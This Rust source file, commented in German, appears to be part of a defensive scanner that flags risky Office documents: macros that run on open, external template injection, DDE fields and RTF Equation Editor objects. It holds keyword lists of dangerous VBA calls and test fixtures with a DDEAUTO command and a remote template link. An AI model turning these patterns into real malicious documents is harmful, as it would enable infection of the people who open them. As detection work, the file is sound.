//! Office-Dokumente: VBA-Makros (OLE und OOXML, über das YARA-X-Modul `vba`), externe
//! Vorlagen/Objekte und DDE in OOXML, eingebettete Objekte in RTF. Nur lesen.

use std::io::{Cursor, Read};

use crate::finding::{Reason, Source, Weight};

/// OLE-Verbunddatei (alte Office-Formate .doc/.xls/.ppt, MSI).
#[must_use]
pub fn is_ole(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1])
}

/// RTF-Dokument.
#[must_use]
pub fn is_rtf(bytes: &[u8]) -> bool {
    bytes.starts_with(b"{\\rt")
}

/// Makro-Namen, die beim Öffnen/Schließen automatisch laufen.
const AUTO_EXEC: [&str; 9] = [
    "autoopen",
    "auto_open",
    "autoexec",
    "autoclose",
    "document_open",
    "documentopen",
    "workbook_open",
    "workbook_activate",
    "document_close",
];

/// Makro-Aufrufe, mit denen Programme gestartet oder Dateien geladen werden.
const RISKY_CALLS: [&str; 12] = [
    "shell(",
    "wscript.shell",
    "createobject(",
    "urldownloadtofile",
    "powershell",
    "cmd /c",
    "cmd.exe",
    "msxml2.xmlhttp",
    "winhttp",
    "adodb.stream",
    ".savetofile",
    "callbyname",
];

/// Begründungen aus VBA-Makros (OLE oder OOXML).
#[must_use]
pub fn macro_reasons(bytes: &[u8]) -> Vec<Reason> {
    let Some(vba) = yara_x::mods::invoke::<yara_x::mods::Vba>(bytes) else {
        return Vec::new();
    };
    if !vba.has_macros() {
        return Vec::new();
    }
    let code: String = vba
        .modules
        .iter()
        .map(|m| m.code().to_lowercase())
        .collect::<Vec<_>>()
        .join("\n");
    let auto = AUTO_EXEC.iter().any(|n| code.contains(n));
    let risky: Vec<&str> = RISKY_CALLS
        .iter()
        .copied()
        .filter(|c| code.contains(c))
        .collect();
    let mut out = vec![Reason::new(
        "office.macros",
        Source::Content,
        Weight::Score(15),
        "Das Dokument enthält Makros (VBA-Programmcode).",
        "The document contains macros (VBA program code).",
    )];
    if auto {
        out.push(Reason::new(
            "office.macros.auto_exec",
            Source::Content,
            Weight::Score(15),
            "Ein Makro startet automatisch beim Öffnen oder Schließen.",
            "A macro runs automatically when the document is opened or closed.",
        ));
    }
    if !risky.is_empty() {
        let list = risky.join(", ");
        out.push(Reason::new(
            "office.macros.risky_calls",
            Source::Content,
            Weight::Score(20),
            &format!("Makro kann Programme starten oder Dateien laden ({list})."),
            &format!("Macro can start programs or download files ({list})."),
        ));
    }
    if auto && !risky.is_empty() {
        out.push(Reason::new(
            "office.macros.dropper_pattern",
            Source::Content,
            Weight::Score(20),
            "Typisches Muster: Makro startet beim Öffnen und lädt bzw. startet ein Programm.",
            "Typical pattern: macro runs on open and downloads or starts a program.",
        ));
    }
    out
}

/// Ist das ein OOXML-Dokument (ZIP mit `[Content_Types].xml`)?
#[must_use]
pub fn is_ooxml(bytes: &[u8]) -> bool {
    bytes.starts_with(b"PK\x03\x04")
        && zip::ZipArchive::new(Cursor::new(bytes))
            .is_ok_and(|mut z| z.by_name("[Content_Types].xml").is_ok())
}

/// Höchstgröße einzelner untersuchter XML-Teile.
const MAX_PART: u64 = 16 * 1024 * 1024;

/// Begründungen aus OOXML-Beziehungen und -Inhalten: externe Vorlagen (Template-Injection),
/// externe OLE-Objekte, DDE-Felder.
#[must_use]
pub fn ooxml_reasons(bytes: &[u8]) -> Vec<Reason> {
    let Ok(mut zip) = zip::ZipArchive::new(Cursor::new(bytes)) else {
        return Vec::new();
    };
    let names: Vec<String> = zip
        .file_names()
        .filter_map(|n| n.ok().map(std::borrow::Cow::into_owned))
        .collect();
    let mut external_template = false;
    let mut external_object = false;
    let mut dde = false;
    for name in names.iter().take(2000) {
        let lower = name.to_ascii_lowercase();
        let rels = lower.ends_with(".rels");
        let body = lower.ends_with("document.xml") || lower.ends_with("sheet1.xml");
        if !rels && !body {
            continue;
        }
        let Ok(file) = zip.by_name(name) else {
            continue;
        };
        if file.encrypted() {
            continue;
        }
        let mut text = String::new();
        if file.take(MAX_PART).read_to_string(&mut text).is_err() {
            continue;
        }
        let text = text.to_ascii_lowercase();
        if rels {
            for rel in text.split("<relationship").skip(1) {
                let external = rel.contains("targetmode=\"external\"");
                if external && rel.contains("attachedtemplate") {
                    external_template = true;
                }
                if external && rel.contains("/oleobject") {
                    external_object = true;
                }
            }
        } else if text.contains("ddeauto") || text.contains(" dde ") || text.contains(">dde ") {
            dde = true;
        }
    }
    let mut out = Vec::new();
    if external_template {
        out.push(Reason::new(
            "office.external_template",
            Source::Content,
            Weight::Score(40),
            "Lädt beim Öffnen eine Vorlage aus dem Internet – damit werden oft Makros nachgeladen.",
            "Loads a template from the internet on open – often used to fetch macros.",
        ));
    }
    if external_object {
        out.push(Reason::new(
            "office.external_object",
            Source::Content,
            Weight::Score(30),
            "Bindet ein Objekt aus dem Internet ein.",
            "Embeds an object from the internet.",
        ));
    }
    if dde {
        out.push(Reason::new(
            "office.dde",
            Source::Content,
            Weight::Score(35),
            "Enthält ein DDE-Feld, das beim Öffnen Programme starten kann.",
            "Contains a DDE field that can start programs on open.",
        ));
    }
    out
}

/// Begründungen aus RTF: eingebettete Objekte, automatische Aktualisierung, Formel-Editor.
#[must_use]
pub fn rtf_reasons(bytes: &[u8]) -> Vec<Reason> {
    let head = &bytes[..bytes.len().min(32 * 1024 * 1024)];
    let text = String::from_utf8_lossy(head).to_ascii_lowercase();
    let mut out = Vec::new();
    if text.contains("\\objdata") {
        out.push(Reason::new(
            "office.rtf.embedded_object",
            Source::Content,
            Weight::Score(20),
            "RTF-Dokument mit eingebettetem Objekt.",
            "RTF document with an embedded object.",
        ));
    }
    if text.contains("\\objupdate") {
        out.push(Reason::new(
            "office.rtf.auto_update",
            Source::Content,
            Weight::Score(20),
            "Eingebettetes Objekt wird beim Öffnen automatisch geladen.",
            "Embedded object is loaded automatically on open.",
        ));
    }
    if text.contains("equation.3") {
        out.push(Reason::new(
            "office.rtf.equation_editor",
            Source::Content,
            Weight::Score(30),
            "Nutzt den alten Formel-Editor – eine oft ausgenutzte Schwachstelle.",
            "Uses the old Equation Editor – a frequently exploited vulnerability.",
        ));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn ooxml(parts: &[(&str, &str)]) -> Vec<u8> {
        let mut buf = Cursor::new(Vec::new());
        {
            let mut z = zip::ZipWriter::new(&mut buf);
            let opts: zip::write::SimpleFileOptions = zip::write::SimpleFileOptions::default();
            for (name, body) in parts {
                z.start_file(*name, opts).unwrap();
                z.write_all(body.as_bytes()).unwrap();
            }
            z.finish().unwrap();
        }
        buf.into_inner()
    }

    #[test]
    fn externe_vorlage_und_dde() {
        let doc = ooxml(&[
            ("[Content_Types].xml", "<Types/>"),
            (
                "word/_rels/settings.xml.rels",
                r#"<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://example.invalid/t.dotm" TargetMode="External"/></Relationships>"#,
            ),
            (
                "word/document.xml",
                "<w:instrText> DDEAUTO c:\\x.exe </w:instrText>",
            ),
        ]);
        assert!(is_ooxml(&doc));
        let codes: Vec<String> = ooxml_reasons(&doc).into_iter().map(|r| r.code).collect();
        assert_eq!(codes, ["office.external_template", "office.dde"]);
        let plain = ooxml(&[
            ("[Content_Types].xml", "<Types/>"),
            ("word/document.xml", "<w:t>Hallo</w:t>"),
        ]);
        assert!(ooxml_reasons(&plain).is_empty());
        assert!(!is_ooxml(b"PK\x03\x04kaputt"));
    }

    #[test]
    fn rtf_und_ole_erkennung() {
        let rtf = b"{\\rtf1 {\\object\\objupdate{\\*\\objclass Equation.3}{\\objdata 0105}}}";
        assert!(is_rtf(rtf));
        assert_eq!(rtf_reasons(rtf).len(), 3);
        assert!(rtf_reasons(b"{\\rtf1 Hallo}").is_empty());
        assert!(is_ole(&[0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0]));
        assert!(macro_reasons(b"kein office").is_empty());
    }
}
